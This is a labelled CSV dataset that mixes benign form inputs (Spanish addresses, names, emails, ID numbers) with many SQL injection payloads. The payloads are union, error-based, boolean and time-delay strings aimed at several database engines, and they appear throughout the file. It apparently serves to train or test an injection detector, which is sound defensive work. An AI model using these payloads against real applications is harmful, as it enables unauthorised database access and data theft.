Query,Label
"1')) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (('pqxe' like 'pqxe",1
-4331) as inpx where 9804=9804 union all select 9804#,1
"camino de los cipreses 125,",0
"1'))) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((('eugs'='eugs",1
21520,0
"1""))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (((""text"" like ""text",1
acordelar,0
"1"");select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (""seci""=""seci",1
"1' in boolean mode) or 8514=benchmark(5000000,md5(0x544d5a4c))#",1
"1"") where 9570=9570 rlike (select (case when (1642=3686) then 1 else 0x28 end))--",1
"1%""))) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (((""%""=""",1
"-7347"")) union all select 4360,4360,4360,4360,4360,4360,4360,4360,4360#",1
5537,0
+payar,0
1g5ota323,0
-3634%')) or 2671=2434,1
"1') where 6388=6388 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
06314426y,0
"calle el pilar s/n,",0
"c/ salvador 64, 5c",0
7961872329809538,0
yunquera de henares,0
"-1139) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
"-2254') as dyrv where 9079=9079 union all select 9079,9079,9079,9079,9079,9079,9079,9079#",1
"1') as eany where 3169=3169 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
25320,0
borrajo,0
"1"") where 4172=4172 or (select * from (select(sleep(5)))sddo)#",1
"1))) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
(select (case when (9066=5598) then 1 else 9066*(select 9066 from information_schema.character_sets) end)),1
legitimacin,0
"-2241))) or make_set(9354=9354,7185) and (((6840=6840",1
557ni03r5o,0
"1) where 5615=5615 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--",1
virginia,0
prell@davidymamen.tc,0
-4208%'))) or 1133=9010--,1
sanandreu agramunt,0
1)));begin dbms_lock.sleep(5); end--,1
28194,0
leanizbarrutia mindiola,0
co875r080ora,0
9854854946355075,0
"1%') or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",1
6053,0
santa marina del rey,0
"calle salvador de madariaga s/n,",0
"1';call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"-9315'))) union all select 5057,5057,5057,5057,5057#",1
19392,0
1' and (select * from (select(sleep(5)))gcrr)#,1
terl6z,0
46542533d,0
1 union all select null--,1
69082096d,0
"-1168)) as vlol where 3475=3475 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
"1%"")));select sleep(5) and (((""%""=""",1
"1""))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""eoab"" like ""eoab",1
06650,0
rozele,0
"-7122"") union all select 4002,4002,4002,4002,4002,4002,4002,4002#",1
1';select pg_sleep(5) and 'qfaz' like 'qfaz,1
"1"" where 3018=3018 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--",1
35807418y,0
railey@g-audio.ic,0
takamine_kulky@comonuevo.bv,0
3468950887704772,0
1' where 6583=6583;select case when 4537=8418 then 1 else null end--,1
"1) as kzyb where 7023=7023 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
conrado,0
5690251194310555,0
44651,0
87053274e,0
moncada,0
aurie,0
tristan,0
kapp,0
"1' where 6406=6406;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1
gemma,0
raian,0
"c/ valdes salas, 39 11?c",0
gungor,0
32797115n,0
"-2745') or elt(1032=1032,3623) and ('vfxq'='vfxq",1
1056,0
3u23pe,0
"1' and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)",1
12220649j,0
"1')) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (('wcmt'='wcmt",1
"-6463""))) union all select 3280,3280,3280,3280,3280,3280,3280,3280,3280#",1
"1') or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ('uwbh'='uwbh",1
cheres ochoa,0
"-1084 where 1181=1181 or make_set(9354=9354,7185)--",1
vallart casabella,0
1')));select (case when (5768=9169) then 5768 else 1/(select 0) end)--,1
llub,0
planthar,0
voglis@hiperxxx.au,0
"1' union all select null,null,null,null,null,null,null,null,null,null#",1
lamphier,0
hornillos del camino,0
0551226371339052,0
santa eufemia del arroyo,0
"secuita, la",0
guilas,0
"1 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)# dbzk",1
"cami antic animeta 43,",0
46891,0
11112430a,0
"1"") and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (""qblj"" like ""qblj",1
9875693785507781,0
papali$no,0
setin cardona,0
aldehuela de yeltes,0
katherina,0
torremocha de jadraque,0
"c/ pintor viver s/n, 1?b",0
c/ la marina 187 13?a,0
1)) as foul where 4361=4361 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,1
lora@rocofer.jobs,0
dopico juanes,0
imparato.inch@flexinspect.tc,0
10750198k,0
"el reyezuelo, 15",0
"1%""))) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
1 where 7299=7299 rlike sleep(5)--,1
decuplar,0
"1"") where 7513=7513 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--",1
"calle miquel santandreu 66,",0
"-5420') union all select 2508,2508,2508,2508,2508,2508,2508#",1
"1"" where 9332=9332 union all select null,null,null,null,null,null,null,null,null--",1
ob1et7nt9,0
einar,0
62573420b,0
maurici garrudo,0
"1')) as vqrt where 5173=5173 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
1';select sleep(5) and 'beuk'='beuk,1
sterland@zingtonos.vg,0
arditi-alexis@capitalinvest.vc,0
leocricia,0
2473105316988907,0
"1) where 2010=2010;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1
"de l' aliga 3,",0
1112,0
1'));(select * from (select(sleep(5)))srmq) and (('nbzf' like 'nbzf,1
48031,0
47529,0
"1"") or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (""njdu"" like ""njdu",1
"finca el jardinito, 155,",0
smethurst-salvador@mcrspain.vn,0
-2495)) as hudw where 4197=4197 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,1
1'));begin dbms_lock.sleep(5); end and (('zeyr'='zeyr,1
ondina viejo,0
ljund@casadedurcal.sl,0
"1';select like('abcdefg',upper(hex(randomblob(500000000/2)))) and 'cwuy'='cwuy",1
"1');select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ('fwok' like 'fwok",1
san cristbal de segovia,0
50490,0
"1""))) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (((""vfoh""=""vfoh",1
leonard,0
m43a3u6,0
"-7378' union all select 2071,2071,2071,2071,2071,2071,2071--",1
"1"")) rlike sleep(5) and ((""ahhx"" like ""ahhx",1
cornisamen!to,0
8545414312654589,0
"calle barrio villayuda 169,",0
"-9718%"") union all select 9515,9515,9515#",1
colobran rebull,0
1'+(select trte where 9173=9173 and 2006=2006,1
palau tanquia,0
"1 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",1
77714009e,0
luciano nagel,0
lazure,0
"-9861' union all select 5710,5710,5710,5710,5710--",1
hine7,0
shuster,0
kagioglu almendro,0
fish@erasmusrooms.de,0
ejerci78,0
6531431919171426,0
62183315d,0
"1) where 1622=1622;select benchmark(5000000,md5(0x4c4d6142))--",1
decacque,0
tabar,0
maurizio,0
"-4984%""))) union all select 6980,6980,6980,6980,6980,6980,6980,6980#",1
-8553'+(select adko where 1750=1750 union all select 1750#,1
"1"") where 5870=5870 union all select null,null,null--",1
"-1277"") where 6622=6622 or 3038=3038",1
"1%"" and (2850=6610)*6610 and ""%""=""",1
4259,0
-1765') order by 1--,1
keen,0
2u17z0o,0
rooner_rettig@evelin.com.mobi,0
8838380607178464,0
li74re04,0
"c/ venecia, s/n,",0
8457,0
"1')) as kpdl where 4443=4443 union all select null,null,null,null,null,null--",1
"1) where 6784=6784 and elt(3114=3114,sleep(5))#",1
1')) and 2832=4165--,1
3363230401310436,0
1') where 3767=3767 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--,1
"1"") order by 1#",1
minette,0
"c/ guzman de alfarache, 113 1?a",0
"1"") as lgxc where 1117=1117 union all select null,null,null,null,null,null,null,null#",1
kaps,0
1') as bzem where 4240=4240;select sleep(5)--,1
"-9779')) or make_set(9354=9354,7185) and (('hmzj'='hmzj",1
"1)) as ynzg where 1926=1926 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",1
etreros 8 13a,0
cailla,0
"1) and 8407=(select count(*) from generate_series(1,5000000))",1
"c/ cesareo gonzalez, 170",0
fuentes de andaluca,0
goman@fbi-criminal-network.com.mh,0
8032,0
"1'+(select rwse where 9843=9843 union all select null,null,null,null,null,null,null--",1
pullman-mcclintock@surcosur.st,0
"1"")) and sleep(5) and ((""timv""=""timv",1
"1%') and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
pawluszek segu,0
1';(select * from (select(sleep(5)))acdk)#,1
04607227m,0
"-5052))) union all select 8351,8351,8351,8351#",1
79277536d,0
207,0
slavin@windshiptrader.coop,0
17005940q,0
basileo,0
37171,0
"calle escritor cerda y godoy, 191",0
"1"" or 8466=benchmark(5000000,md5(0x694a4745)) and ""xbft""=""xbft",1
su9ltamente,0
"1%""))) waitfor delay '0:0:5'--",1
"-1097"" where 4421=4421 union all select 4421,4421,4421,4421,4421#",1
6371,0
matosa,0
haker-durango@mirallesmoscardo.ro,0
45025499d,0
3618056132500846,0
1') where 7629=7629 rlike (select * from (select(sleep(5)))vwyq)#,1
corrales de duero,0
shannen,0
4381135407580429,0
"1"") where 2922=2922 or elt(6272=6272,sleep(5))--",1
4811965033503576,0
escrutador,0
flota5iento,0
51285362p,0
3234011820759237,0
1) where 8433=8433 rlike (select (case when (7689=7689) then 1 else 0x28 end))--,1
wendt,0
90127318r,0
kylo,0
"1"")) as yosd where 1255=1255;begin user_lock.sleep(5); end--",1
desempulgadura,0
"1')) as oocd where 2919=2919 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
crampton4,0
tengroth@academiaversal.md,0
brandt,0
+delaxar,0
psitacosis,0
holoubek@hojainformativas.ua,0
"-4044%"" or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ""%""=""",1
"1')) as lxjs where 6503=6503 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",1
tu6e3a5a,0
pages@spainbb.kh,0
-8370')) or (3501=6407)*6407 and (('agcm' like 'agcm,1
"1'))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('qpuy'='qpuy",1
zambrana,0
"calle artigako haritza, s/n 8?d",0
vivaldo,0
"1;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual-- vykx",1
"1 where 6169=6169 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",1
5711670970472426,0
"1,(select (case when (4828=2600) then 1 else 1/(select 0) end))",1
"1'))) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((('ofko'='ofko",1
"-9574') as rxym where 4719=4719 union all select 4719,4719,4719,4719,4719,4719,4719--",1
clodettes_pierson@repretexbcn.ml,0
"1"" rlike (select * from (select(sleep(5)))sgvo) and ""cxsu"" like ""cxsu",1
uribitarte 72 13?g,0
"plaza movimiento ciudadano, 176",0
calle alqueria de aznar 166,0
65046174n,0
7362218101347433,0
aborr-ascarse,0
223v35o,0
"1'))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((('hryb'='hryb",1
villalobar de rioja,0
"1))) and elt(1210=1210,sleep(5)) and (((2341=2341",1
desmerecer,0
entregadora,0
"1%"")(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (""%""=""",1
"1%');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"1"") or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""rkfk"" like ""rkfk",1
"-1550%""))) order by 1--",1
galt@automovilesalhambra.kr,0
berber_wosper@foreignoffice.kn,0
protectorio,0
"1"" and sleep(5)",1
smithdea,0
9369957751298243,0
schnirer,0
russel@hipermadrid.wf,0
lareine2,0
"1%' and make_set(8403=8403,8899) and '%'='",1
ramells lam,0
cusell vinageras,0
"1"")) and (select * from (select(sleep(5)))gcrr)#",1
1')) as iuta where 1482=1482;waitfor delay '0:0:5'--,1
"1""))) or 6793=(select 6793 from pg_sleep(5)) and (((""zgoy"" like ""zgoy",1
1');select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,1
"1 where 3902=3902 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
1')) as stnn where 6160=6160 and 8881=7347--,1
-3867%') or 3084=5633 and ('%'=',1
adalino,0
"1') where 9951=9951 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",1
casas de miravete,0
1) as bozx where 2160=2160 and sleep(5)#,1
epps6,0
calle escalona s/n,0
7964537114213279,0
"1"") where 4426=4426 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",1
"1"") or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (""igop""=""igop",1
"doctor ramon sanchez-parra, 17 11?d",0
26540,0
sureda bahamonde,0
18653468p,0
"1' where 6853=6853 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",1
9307824408281680,0
5013,0
1%')));select sleep(5)#,1
-4057') order by 1#,1
1'||(select 'xglm' from dual where 3556=3556 or 4240=(select 4240 from pg_sleep(5))--,1
20739,0
prepost1ra9in,0
shupe,0
bnrlsi,0
se0am536e,0
13194,0
"calle archiduque carlos, 97 9?g",0
lippman,0
34120,0
mannkopf.gray@ajuntamentbcn2-0.il,0
7an8o15a,0
des81ra92,0
7463689061986370,0
soulef,0
1') or sleep(5) and ('fizk'='fizk,1
ohtomo@aldufa.im,0
carrillo-whitson@mobilecrm.fj,0
kim,0
"1'||(select 'dajl' from dual where 8440=8440;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1
moux claver,0
49540,0
just darns,0
2u27lad9r4,0
13679,0
"1';call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'ekhi'='ekhi",1
marra,0
"-9384%"" union all select 7031,7031,7031,7031,7031,7031,7031,7031,7031#",1
0854278659322549,0
herrera de los navarros,0
491vi06a5,0
"pl. de monteleon 60,",0
-9711'+(select 'ckpj' where 8338=8338 union all select 8338--,1
praza capela 114 8-c,0
"1' in boolean mode) union all select null,null--",1
copley@pisossantcugat.bf,0
"-3595'+(select vppx where 6018=6018 union all select 6018,6018,6018,6018,6018#",1
marchagaz,0
4431931876895268,0
94318165h,0
70996380a,0
1' or (select * from (select(sleep(5)))ydpu) and 'bwtk'='bwtk,1
7674396094976152,0
mauro,0
"1"") where 4180=4180 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",1
sait,0
goldwyn,0
"1'||(select 'ymez' from dual where 9870=9870 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
"torre de esteban hambrn, la",0
1'+(select gqez where 3704=3704;select (case when (9030=6952) then 1 else 9030*(select 9030 from master..sysdatabases) end)--,1
tele,0
zigrand,0
frydtberg@archivodeimagenes.cat,0
jo-allen@engibraltar.zr,0
arlan,0
-s9rete,0
4271773841923976,0
"1 where 4468=4468 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
navarra,0
b23a3io,0
"1%')) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (('%'='",1
estupian lladonet,0
"1' or 8466=benchmark(5000000,md5(0x694a4745)) and 'raru'='raru",1
96to3a38,0
sancarranco cantabella,0
33529,0
skolnik-daye@joll.ws,0
-7648') or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric),1
montesano_wontner@pcvirus.tm,0
"1) where 9469=9469 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
(select (case when (3348=1710) then 3348 else cast(1 as int)/(select 0 from dual) end) from dual),1
"sin sol 15,",0
"av. pablo iglesias 106,",0
"1"");(select * from (select(sleep(5)))srmq) and (""vjlr"" like ""vjlr",1
